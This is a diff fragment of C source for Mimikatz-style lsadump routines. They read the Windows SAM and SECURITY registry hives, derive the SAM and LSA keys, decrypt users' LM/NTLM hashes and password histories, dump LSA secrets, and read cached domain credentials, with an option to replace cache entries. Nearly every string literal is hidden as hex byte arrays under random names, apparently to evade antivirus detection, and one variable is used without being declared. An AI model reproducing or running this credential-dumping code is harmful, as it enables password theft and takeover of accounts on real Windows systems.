+	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSAMBase, hid_S_A_M__nNZDwUFJeQT0, 0, KEY_READ, &hAccount))
+	{
+		if(kuhl_m_lsadump_getSamKey(hRegistry, hAccount, sysKey, samKey))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hRegistry, hAccount, hid_U_s_e__ZpO1b1qYNn2B, 0, KEY_READ, &hUsers))
+			{
+				if(status = kull_m_registry_RegQueryInfoKey(hRegistry, hUsers, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
+				{
+					szMaxSubKeyLen++;
+					if(user = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
+					{
+						for(i = 0; i < nbSubKeys; i++)
+						{
+							szUser = szMaxSubKeyLen;
+							if(kull_m_registry_RegEnumKeyEx(hRegistry, hUsers, i, user, &szUser, NULL, NULL, NULL, NULL))
+							{
+								if(_wcsicmp(user, hid_N_a_m__emXAzbU2bjAY))
+								{
+									if(swscanf_s(user, L"%x", &rid) != -1)
+									{
+										kprintf(hid___R_I__YF1qrTz80rqZ, rid, rid);
+										if(status &= kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hUsers, user, L"V", NULL, (LPVOID *) &pUAv, NULL))
+										{
+											kprintf(hid_U_s_e__6MLHZt7XFx4r, pUAv->Username.lenght / sizeof(wchar_t), (wchar_t *) (pUAv->datas + pUAv->Username.offset));
+											kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE, FALSE);
+											kuhl_m_lsadump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE, FALSE);
+											kuhl_m_lsadump_getHash(&pUAv->LMHistory, pUAv->datas, samKey, rid, FALSE, TRUE);
+											kuhl_m_lsadump_getHash(&pUAv->NTLMHistory, pUAv->datas, samKey, rid, TRUE, TRUE);
+											LocalFree(pUAv);
+										}
+									}
+								}
+							}
+						}
+						LocalFree(user);
+					}
+				}
+				kull_m_registry_RegCloseKey(hRegistry, hUsers);
+			}
+		}
+		else PRINT_ERROR(L"kuhl_m_lsadump_getSamKey KO\n");
+		kull_m_registry_RegCloseKey(hRegistry, hAccount);
+	}
+	else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx SAM Accounts");
+
+	return status;
+}
+
+
+const char  hid_NTPASS_M2pUN7lAfrfG[] = {'\x4e','\x54','\x50','\x41','\x53','\x53','\x57','\x4f','\x52','\x44',0};
+
+const char  hid_LMPASS_euMJvMl16vT7[] = {'\x4c','\x4d','\x50','\x41','\x53','\x53','\x57','\x4f','\x52','\x44',0};
+
+const char  hid_NTPASS_kUPlBJgPG1IY[] = {'\x4e','\x54','\x50','\x41','\x53','\x53','\x57','\x4f','\x52','\x44','\x48','\x49','\x53','\x54','\x4f','\x52','\x59',0};
+
+const char  hid_LMPASS_xOBlrhf5tPh3[] = {'\x4c','\x4d','\x50','\x41','\x53','\x53','\x57','\x4f','\x52','\x44','\x48','\x49','\x53','\x54','\x4f','\x52','\x59',0};
+const const BYTE* kuhl_m_lsadump_LMPASSWORDHISTORY = (const BYTE*  )hid_LMPASS_xOBlrhf5tPh3;
+BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm, BOOL isHistory)
+{
+	BOOL status = FALSE;
+	MD5_CTX md5ctx;
+	PSAM_HASH pHash = (PSAM_HASH) (pStartOfData + pSamHash->offset);
+	PSAM_HASH_AES pHashAes;
+	CRYPTO_BUFFER cypheredHashBuffer = {0, 0, NULL}, keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	PVOID out;
+	DWORD len;
+	
+	if(pSamHash->offset)
+	{
+		switch(pHash->Revision)
+		{
+		case 1:
+			if(pSamHash->lenght >= sizeof(SAM_HASH))
+			{
+				MD5Init(&md5ctx);
+				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+				MD5Update(&md5ctx, &rid, sizeof(DWORD));
+				MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
+				MD5Final(&md5ctx);
+				cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+				if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
+				{
+					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
+					if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
+						PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+				}
+			}
+			break;
+		case 2:
+			pHashAes = (PSAM_HASH_AES) pHash;
+			if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
+			{
+				if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
+				{
+					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
+					if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
+					{
+						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
+						status = TRUE;
+					}
+					LocalFree(out);
+				}
+			}
+			break;
+		default:
+			PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
+		}
+		if(status)
+			kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM" ) : (isHistory ? L"lm  " : L"LM  "), isHistory);
+		if(cypheredHashBuffer.Buffer)
+			LocalFree(cypheredHashBuffer.Buffer);
+	}
+	return status;
+}
+
+
+const char  hid________kzYvSyKsFPTI[] = {'\x21','\x40','\x23','\x24','\x25','\x5e','\x26','\x2a','\x28','\x29','\x71','\x77','\x65','\x72','\x74','\x79','\x55','\x49','\x4f','\x50','\x41','\x7a','\x78','\x63','\x76','\x62','\x6e','\x6d','\x51','\x51','\x51','\x51','\x51','\x51','\x51','\x51','\x51','\x51','\x51','\x51','\x29','\x28','\x2a','\x40','\x26','\x25',0};
+const const BYTE* kuhl_m_lsadump_qwertyuiopazxc = (const BYTE*  )hid________kzYvSyKsFPTI;
+
+const char  hid________hnmV3WXBTUNE[] = {'\x30','\x31','\x32','\x33','\x34','\x35','\x36','\x37','\x38','\x39','\x30','\x31','\x32','\x33','\x34','\x35','\x36','\x37','\x38','\x39','\x30','\x31','\x32','\x33','\x34','\x35','\x36','\x37','\x38','\x39','\x30','\x31','\x32','\x33','\x34','\x35','\x36','\x37','\x38','\x39',0};
+const const BYTE* kuhl_m_lsadump_01234567890123 = (const BYTE*  )hid________hnmV3WXBTUNE;
+BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, LPCBYTE sysKey, LPBYTE samKey)
+{
+	
+	 wchar_t  hid___S_A__SVYeatpW0zRY[] = {'\n','\x53','\x41','\x4d','\x4b','\x65','\x79','\x20','\x3a','\x20',0};
+BOOL status = FALSE;
+	PDOMAIN_ACCOUNT_F pDomAccF;
+	MD5_CTX md5ctx;
+	CRYPTO_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	PSAM_KEY_DATA_AES pAesKey;
+	PVOID out;
+	DWORD len;
+
+	kprintf(hid___S_A__SVYeatpW0zRY);
+	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hAccount, NULL, L"F", NULL, (LPVOID *) &pDomAccF, NULL))
+	{
+		switch(pDomAccF->Revision)
+		{
+		case 2:
+			if(pDomAccF->keys1.Revision == 1)
+			{
+				MD5Init(&md5ctx);
+				MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
+				MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
+				MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
+				MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
+				MD5Final(&md5ctx);
+				RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
+				if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key))))
+					PRINT_ERROR(L"RtlEncryptDecryptRC4 KO");
+			}
+			else PRINT_ERROR(L"Unknow Classic Struct Key revision (%u)", pDomAccF->keys1.Revision);
+			break;
+		case 3:
+			pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
+			if(pAesKey->Revision == 2)
+			{
+				pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
+				if(kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
+				{
+					if(status = (len == SAM_KEY_DATA_KEY_LENGTH))
+						RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);
+					LocalFree(out);
+				}
+			}
+			else PRINT_ERROR(L"Unknow Struct Key revision (%u)", pDomAccF->keys1.Revision);
+			break;
+		default:
+			PRINT_ERROR(L"Unknow F revision (%hu)", pDomAccF->Revision);
+		}
+		LocalFree(pDomAccF);
+	}
+	else PRINT_ERROR(L"kull_m_registry_OpenAndQueryWithAlloc KO");
+
+	if(status)
+		kull_m_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);
+
+	kprintf(L"\n");
+	return status;
+}
+
+BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN LPCWSTR littleKey, IN LPCWSTR prefix)
+{
+	
+	const wchar_t  hid_P_o_l__hCICqCfGO7jf[] = {'\x50','\x6f','\x6c','\x5f','\x5f','\x44','\x6d','\x4e',0};
+
+	const wchar_t  hid_P_o_l__d1qq4nNJZ4QX[] = {'\x50','\x6f','\x6c','\x5f','\x5f','\x44','\x6d','\x53',0};
+
+	 wchar_t  hid___s____TdXp3vJ5Q8xd[] = {'\x25','\x73','\x20','\x6e','\x61','\x6d','\x65','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid___w_Z__ve4Fe9LE69ud[] = {'\x25','\x77','\x5a',0};
+
+	 wchar_t  hid________YnBfvHhMVgAu[] = {'\x20','\x28','\x20',0};
+BOOL status = FALSE;
+	wchar_t* sid = (wchar_t*  )hid_P_o_l__d1qq4nNJZ4QX;
+	PVOID buffer;
+	LSA_UNICODE_STRING uString = {0, 0, NULL};
+
+	RtlCopyMemory(&name[3], littleKey, 2*sizeof(wchar_t));
+	RtlCopyMemory(&sid[3], littleKey, 2*sizeof(wchar_t));
+	kprintf(hid___s____TdXp3vJ5Q8xd, prefix);
+	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, name, NULL, NULL, &buffer, NULL))
+	{
+		uString.Length = ((PUSHORT) buffer)[0];
+		uString.MaximumLength = ((PUSHORT) buffer)[1];
+		uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
+		kprintf(hid___w_Z__ve4Fe9LE69ud, &uString);
+		LocalFree(buffer);
+	}
+	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, sid, NULL, NULL, &buffer, NULL))
+	{
+		kprintf(hid________YnBfvHhMVgAu);
+		kull_m_string_displaySID((PSID) buffer);
+		kprintf(L" )");
+		LocalFree(buffer);
+	}
+	kprintf(L"\n");
+	return status;
+}
+
+BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
+{
+	
+	const wchar_t  hid_P_o_l__JQgQx2DJMRhU[] = {'\x50','\x6f','\x6c','\x69','\x63','\x79',0};
+
+	const wchar_t  hid_L_o_c__8sZHdcnsEivu[] = {'\x4c','\x6f','\x63','\x61','\x6c',0};
+
+	const wchar_t  hid_D_o_m__fyFdr80vYEuz[] = {'\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	const wchar_t  hid_P_o_l__MWznbeV4gUMw[] = {'\x50','\x6f','\x6c','\x44','\x6e','\x44','\x44','\x4e',0};
+
+	 wchar_t  hid_D_o_m__t7vFtBTUkKo0[] = {'\x44','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x46','\x51','\x44','\x4e','\x20','\x3a','\x20','\x25','\x77','\x5a','\n',0};
+
+	const wchar_t  hid_P_o_l__AVu4Jc8rs6Ut[] = {'\x50','\x6f','\x6c','\x52','\x65','\x76','\x69','\x73','\x69','\x6f','\x6e',0};
+
+	 wchar_t  hid___P_o__jP6UtxOIBjx3[] = {'\n','\x50','\x6f','\x6c','\x69','\x63','\x79','\x20','\x73','\x75','\x62','\x73','\x79','\x73','\x74','\x65','\x6d','\x20','\x69','\x73','\x20','\x3a','\x20','\x25','\x68','\x75','\x2e','\x25','\x68','\x75','\n',0};
+
+	 wchar_t  hid_L_S_A__DNSe3r3Lf354[] = {'\x4c','\x53','\x41','\x20','\x4b','\x65','\x79','\x28','\x73','\x29','\x20','\x3a','\x20','\x25','\x75','\x2c','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20',0};
+
+	 wchar_t  hid________h5c11ilOwcOr[] = {'\x20','\x20','\x5b','\x25','\x30','\x32','\x75','\x5d','\x20',0};
+
+	 wchar_t  hid_L_S_A__YGfXY4MTZubW[] = {'\x4c','\x53','\x41','\x20','\x4b','\x65','\x79','\x20','\x3a','\x20',0};
+BOOL status = FALSE;
+	HKEY hPolicy;
+	PPOL_REVISION pPolRevision;
+	DWORD szNeeded, i, offset;
+	LPVOID buffer;
+	MD5_CTX md5ctx;
+	CRYPTO_BUFFER data = {3 * sizeof(NT5_SYSTEM_KEY), 3 * sizeof(NT5_SYSTEM_KEY), NULL}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
+	PNT6_SYSTEM_KEYS nt6keysStream = NULL;
+	PNT6_SYSTEM_KEY nt6key;
+	PNT5_SYSTEM_KEY nt5key = NULL;
+	LSA_UNICODE_STRING uString = {0, 0, NULL};
+
+	if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, hid_P_o_l__JQgQx2DJMRhU, 0, KEY_READ, &hPolicy))
+	{
+		kprintf(L"\n");
+		kuhl_m_lsadump_getSids(hSecurity, hPolicy, L"Ac", hid_L_o_c__8sZHdcnsEivu);
+		kuhl_m_lsadump_getSids(hSecurity, hPolicy, L"Pr", hid_D_o_m__fyFdr80vYEuz);
+
+		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, hid_P_o_l__MWznbeV4gUMw, NULL, NULL, &buffer, NULL))
+		{
+			uString.Length = ((PUSHORT) buffer)[0];
+			uString.MaximumLength = ((PUSHORT) buffer)[1];
+			uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
+			kprintf(hid_D_o_m__t7vFtBTUkKo0, &uString);
+			LocalFree(buffer);
+		}
+
+		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, hid_P_o_l__AVu4Jc8rs6Ut, NULL, NULL, (LPVOID *) &pPolRevision, NULL))
+		{
+			kprintf(hid___P_o__jP6UtxOIBjx3, pPolRevision->Major, pPolRevision->Minor);
+			if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, (pPolRevision->Minor > 9) ? L"PolEKList" : L"PolSecretEncryptionKey", NULL, NULL, &buffer, &szNeeded))
+			{
+				if(pPolRevision->Minor > 9) // NT 6
+				{
+					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) buffer, szNeeded, NULL, sysKey))
+					{
+						if(nt6keysStream = (PNT6_SYSTEM_KEYS) LocalAlloc(LPTR, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize))
+						{
+							RtlCopyMemory(nt6keysStream, ((PNT6_HARD_SECRET) buffer)->clearSecret.Secret, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize);
+							kprintf(hid_L_S_A__DNSe3r3Lf354, nt6keysStream->nbKeys); kull_m_string_displayGUID(&nt6keysStream->CurrentKeyID); kprintf(L"\n");
+							for(i = 0, offset = 0; i < nt6keysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + nt6key->KeySize)
+							{
+								nt6key = (PNT6_SYSTEM_KEY) ((PBYTE) nt6keysStream->Keys + offset);
+								kprintf(hid________h5c11ilOwcOr, i); kull_m_string_displayGUID(&nt6key->KeyId); kprintf(L" "); kull_m_string_wprintf_hex(nt6key->Key, nt6key->KeySize, 0); kprintf(L"\n");
+							}
+						}
+					}
+				}
+				else // NT 5
+				{
+					MD5Init(&md5ctx);
+					MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
+					for(i = 0; i < 1000; i++)
+						MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_IV_SIZE);
+					MD5Final(&md5ctx);
+					data.Buffer = (PBYTE) ((PNT5_SYSTEM_KEYS) buffer)->keys;
+					if(NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
+					{
+						if(nt5key = (PNT5_SYSTEM_KEY) LocalAlloc(LPTR, sizeof(NT5_SYSTEM_KEY)))
+						{
+							RtlCopyMemory(nt5key->key, ((PNT5_SYSTEM_KEYS) buffer)->keys[1].key, sizeof(NT5_SYSTEM_KEY));
+							kprintf(hid_L_S_A__YGfXY4MTZubW); 
+							kull_m_string_wprintf_hex(nt5key->key, sizeof(NT5_SYSTEM_KEY), 0);
+							kprintf(L"\n");
+						}
+					}
+				}
+				LocalFree(buffer);
+			}
+			LocalFree(pPolRevision);
+		}
+
+		if(nt6keysStream || nt5key)
+		{
+			if(secretsOrCache)
+				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);
+			else
+				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, pCacheData);
+		}
+		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
+	}
+
+	if(nt6keysStream)
+		LocalFree(nt6keysStream);
+	if(nt5key)
+		LocalFree(nt5key);
+
+	return status;
+}
+
+BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
+{
+	
+	const wchar_t  hid_S_e_c__J4XoJCVMk4uR[] = {'\x53','\x65','\x63','\x72','\x65','\x74','\x73',0};
+
+	const wchar_t  hid_s_e_r__Yfk71oVd9txf[] = {'\x73','\x65','\x72','\x76','\x69','\x63','\x65','\x73',0};
+
+	 wchar_t  hid___S_e__0bAi71TNLTq8[] = {'\n','\x53','\x65','\x63','\x72','\x65','\x74','\x20','\x20','\x3a','\x20','\x25','\x73',0};
+
+	const wchar_t  hid___S_C__rPBfyZw1VNqT[] = {'\x5f','\x53','\x43','\x5f',0};
+
+	const wchar_t  hid_C_u_r__aJkhOudPSJkY[] = {'\x43','\x75','\x72','\x72','\x56','\x61','\x6c',0};
+
+	 wchar_t  hid___c_u__HtACe9GLRRXl[] = {'\n','\x63','\x75','\x72','\x2f',0};
+
+	const wchar_t  hid_O_l_d__1uRfQohKPncY[] = {'\x4f','\x6c','\x64','\x56','\x61','\x6c',0};
+
+	 wchar_t  hid___o_l__ABSA2F4m6ps7[] = {'\n','\x6f','\x6c','\x64','\x2f',0};
+BOOL status = FALSE;
+	HKEY hSecrets, hSecret, hCurrentControlSet, hServiceBase;
+	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
+	PVOID pSecret;
+	wchar_t * secretName;
+
+	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, hid_S_e_c__J4XoJCVMk4uR, 0, KEY_READ, &hSecrets))
+	{
+		if(kuhl_m_lsadump_getCurrentControlSet(hSystem, hSystemBase, &hCurrentControlSet))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hSystem, hCurrentControlSet, hid_s_e_r__Yfk71oVd9txf, 0, KEY_READ, &hServiceBase))
+			{
+				if(kull_m_registry_RegQueryInfoKey(hSecurity, hSecrets, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
+				{
+					szMaxSubKeyLen++;
+					if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
+					{
+						for(i = 0; i < nbSubKeys; i++)
+						{
+							szSecretName = szMaxSubKeyLen;
+							if(kull_m_registry_RegEnumKeyEx(hSecurity, hSecrets, i, secretName, &szSecretName, NULL, NULL, NULL, NULL))
+							{
+								kprintf(hid___S_e__0bAi71TNLTq8, secretName);
+
+								if(_wcsnicmp(secretName, hid___S_C__rPBfyZw1VNqT, 4) == 0)
+									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);
+
+								if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecrets, secretName, 0, KEY_READ, &hSecret))
+								{
+									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, hid_C_u_r__aJkhOudPSJkY, lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
+									{
+										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, hid___c_u__HtACe9GLRRXl, secretName);
+										LocalFree(pSecret);
+									}
+									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, hid_O_l_d__1uRfQohKPncY, lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
+									{
+										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, hid___o_l__ABSA2F4m6ps7, secretName);
+										LocalFree(pSecret);
+									}
+									kull_m_registry_RegCloseKey(hSecurity, hSecret);
+								}
+								kprintf(L"\n");
+							}
+						}
+						LocalFree(secretName);
+					}
+				}
+				kull_m_registry_RegCloseKey(hSystem, hServiceBase);
+			}
+			kull_m_registry_RegCloseKey(hSystem, hCurrentControlSet);
+		}
+		kull_m_registry_RegCloseKey(hSecurity, hSecrets);
+	}
+	return status;
+}
+
+BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
+{
+	
+	const wchar_t  hid_S_e_c__t3y2L54BdILa[] = {'\x53','\x65','\x63','\x72','\x65','\x74','\x73','\\','\x4e','\x4c','\x24','\x4b','\x4d','\\','\x43','\x75','\x72','\x72','\x56','\x61','\x6c',0};
+
+	const wchar_t  hid_C_a_c__MYApnhTgGlF5[] = {'\x43','\x61','\x63','\x68','\x65',0};
+
+	const wchar_t  hid_N_L____w43eRKcWqm7J[] = {'\x4e','\x4c','\x24','\x49','\x74','\x65','\x72','\x61','\x74','\x69','\x6f','\x6e','\x43','\x6f','\x75','\x6e','\x74',0};
+
+	 wchar_t  hid_____N__GqNoPxzc1UU9[] = {'\x2a','\x20','\x4e','\x4c','\x24','\x49','\x74','\x65','\x72','\x61','\x74','\x69','\x6f','\x6e','\x43','\x6f','\x75','\x6e','\x74','\x20','\x69','\x73','\x20','\x25','\x75','\x2c','\x20','\x25','\x75','\x20','\x72','\x65','\x61','\x6c','\x20','\x69','\x74','\x65','\x72','\x61','\x74','\x69','\x6f','\x6e','\x28','\x73','\x29','\n',0};
+
+	 wchar_t  hid_____D__q2L5ydE5kiNf[] = {'\x2a','\x20','\x44','\x43','\x43','\x31','\x20','\x6d','\x6f','\x64','\x65','\x20','\x21','\n',0};
+
+	 wchar_t  hid_____I__EcXpMocwcGRG[] = {'\x2a','\x20','\x49','\x74','\x65','\x72','\x61','\x74','\x69','\x6f','\x6e','\x20','\x69','\x73','\x20','\x73','\x65','\x74','\x20','\x74','\x6f','\x20','\x64','\x65','\x66','\x61','\x75','\x6c','\x74','\x20','\x28','\x31','\x30','\x32','\x34','\x30','\x29','\n',0};
+
+	const wchar_t  hid_N_L____61RsMbqmhGF3[] = {'\x4e','\x4c','\x24','\x43','\x6f','\x6e','\x74','\x72','\x6f','\x6c',0};
+
+	const wchar_t  hid_N_L____1CDbT72b3DM1[] = {'\x4e','\x4c','\x24','\x49','\x74','\x65','\x72','\x61','\x74','\x69','\x6f','\x6e','\x43','\x6f','\x75','\x6e','\x74',0};
+
+	 wchar_t  hid________yTxLLNgyN8yb[] = {'\n','\x5b','\x25','\x73','\x20','\x2d','\x20',0};
+
+	 wchar_t  hid_____R__XaR1C4TMBfVp[] = {'\x5d','\n','\x52','\x49','\x44','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x30','\x38','\x78','\x20','\x28','\x25','\x75','\x29','\n',0};
+
+	 wchar_t  hid_____U__pnnxSwhV9HAL[] = {'\x3e','\x20','\x55','\x73','\x65','\x72','\x20','\x63','\x61','\x63','\x68','\x65','\x20','\x72','\x65','\x70','\x6c','\x61','\x63','\x65','\x20','\x6d','\x6f','\x64','\x65','\x20','\x28','\x32','\x29','\x21','\n',0};
+
+	 wchar_t  hid_____M__AsUAMiBjQItJ[] = {'\x20','\x20','\x4d','\x73','\x43','\x61','\x63','\x68','\x65','\x56','\x32','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid_____C__29RP8n0StZHH[] = {'\x20','\x20','\x43','\x68','\x65','\x63','\x6b','\x73','\x75','\x6d','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid_____O__tmXd30xOVvYg[] = {'\x3e','\x20','\x4f','\x4b','\x21','\n',0};
+
+	 wchar_t  hid_____U__UHoDpNiikBPk[] = {'\x3e','\x20','\x55','\x73','\x65','\x72','\x20','\x63','\x61','\x63','\x68','\x65','\x20','\x72','\x65','\x70','\x6c','\x61','\x63','\x65','\x20','\x6d','\x6f','\x64','\x65','\x20','\x28','\x31','\x29','\x21','\n',0};
+
+	 wchar_t  hid_____M__B0yyk3uUjD3f[] = {'\x20','\x20','\x4d','\x73','\x43','\x61','\x63','\x68','\x65','\x56','\x31','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid_____C__TfvtNhygHORD[] = {'\x20','\x20','\x43','\x68','\x65','\x63','\x6b','\x73','\x75','\x6d','\x20','\x20','\x3a','\x20',0};
+
+	 wchar_t  hid_____O__NLlbf4tqyXpR[] = {'\x3e','\x20','\x4f','\x4b','\x21','\n',0};
+BOOL status = FALSE, hashStatus;
+	HKEY hCache;
+	DWORD i, iter = 10240, szNLKM, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
+	PVOID pNLKM;
+	wchar_t * secretName;
+	PMSCACHE_ENTRY pMsCacheEntry;
+	NTSTATUS nStatus;
+	BYTE digest[MD5_DIGEST_LENGTH];
+	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
+	LSA_UNICODE_STRING usr;
+	
+
+	if(kuhl_m_lsadump_decryptSecret(hSecurity, hPolicyBase, hid_S_e_c__t3y2L54BdILa, lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
+	{
+		if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, hid_C_a_c__MYApnhTgGlF5, 0, KEY_READ | (pCacheData ? (pCacheData->username ? KEY_WRITE : 0) : 0), &hCache))
+		{
+			if(lsaKeysStream)
+			{
+				kprintf(L"\n");
+				if(kull_m_registry_RegQueryValueEx(hSecurity, hCache, hid_N_L____w43eRKcWqm7J, NULL, NULL, (LPBYTE) &i, &szNeeded))
+				{
+					iter = (i > 10240) ? (i & ~0x3ff) : (i << 10);
+					kprintf(hid_____N__GqNoPxzc1UU9, i, iter);
+					if(!i)
+						kprintf(hid_____D__q2L5ydE5kiNf);
+				}
+				else kprintf(hid_____I__EcXpMocwcGRG);
+			}
+
+			if(kull_m_registry_RegQueryInfoKey(hSecurity, hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
+			{
+				szMaxValueNameLen++;
+				if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
+				{
+					if(pMsCacheEntry = (PMSCACHE_ENTRY) LocalAlloc(LPTR, szMaxValueLen))
+					{
+						for(i = 0; i < nbValues; i++)
+						{
